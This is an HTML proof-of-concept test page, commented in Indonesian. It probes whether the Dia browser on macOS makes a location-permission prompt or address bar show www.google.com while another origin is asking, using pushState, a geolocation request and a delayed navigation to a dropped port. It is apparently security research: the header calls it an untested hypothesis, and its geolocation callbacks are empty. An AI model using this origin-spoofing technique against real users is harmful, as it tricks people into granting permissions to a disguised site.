<!-- SF-DIA-01 | GENOME A=dead-port(DROP) B=pushState+location.href C=2xrAF+80ms D=S5 permission-prompt (+S1) E=- F=same-doc G=desktop-topbar X=dia-macos
     ASAL     : port 1:1 dari PoC iOS-Chrome milik operator (geolocation origin desync). Yang diuji di sini:
                apakah Dia/macOS ikut mengecat bar dari navigasi PENDING yang dimulai SKRIP di TAB YANG SAMA.
     PREDIKAT : prompt izin lokasi (dan/atau address bar) menyebut www.google.com sementara dokumen yang meminta
                adalah origin yang tercetak di panel bawah.
     ORACLE   : klik Run -> prompt izin muncul -> baca origin DI PROMPT + di bar -> bandingkan dengan panel -> screenshot.
     EXPECTED-SECURE: Chromium desktop tidak mengecat pending-URL untuk navigasi renderer-initiated di tab yang sama,
                dan prompt terikat ke origin dokumen yang SUDAH commit. Jadi bar & prompt tetap origin asli
                -> arm INERT. Itu hasil yang SAH: catat sebagai ilmu-negatif, jangan dipaksa.
     KONTROL  : tombol CONTROL (port 443 hidup).
     KNOB     : 9090 dipilih karena DI-DROP (bukan RST). Kalau langsung muncul error page = port me-REFUSE ->
                ganti 8443 / 8080 / 82. DROP != REFUSE menentukan jalan/tidaknya seluruh keluarga ini.
     CATATAN  : koordinat TIDAK pernah dibaca/disimpan/dikirim - kedua callback sengaja kosong.
     STATUS   : HIPOTESIS - belum diuji di Dia. -->
<meta charset="utf-8"><title>01 same-tab permission desync</title>
<h3>01 &mdash; permission prompt + pending URL (port langsung dari iOS)</h3>
<button onclick="run()">Run 01</button> <button onclick="ctl()">CONTROL</button>
<pre id="p"></pre>
<script>
var T = 'https://www.google.com:9090/';   // HOLD: port yang di-DROP
var L = 'https://www.google.com/';        // CONTROL: port hidup
document.getElementById('p').textContent =
  'REAL origin : ' + location.origin + '\nREAL href   : ' + location.href;
function arm(u){
  history.pushState({}, '', '/trusted');
  navigator.geolocation.getCurrentPosition(function(){}, function(){});
  requestAnimationFrame(function(){ requestAnimationFrame(function(){
    setTimeout(function(){ location.href = u; }, 80); }); });
}
function run(){ arm(T); }
function ctl(){ arm(L); }
</script>
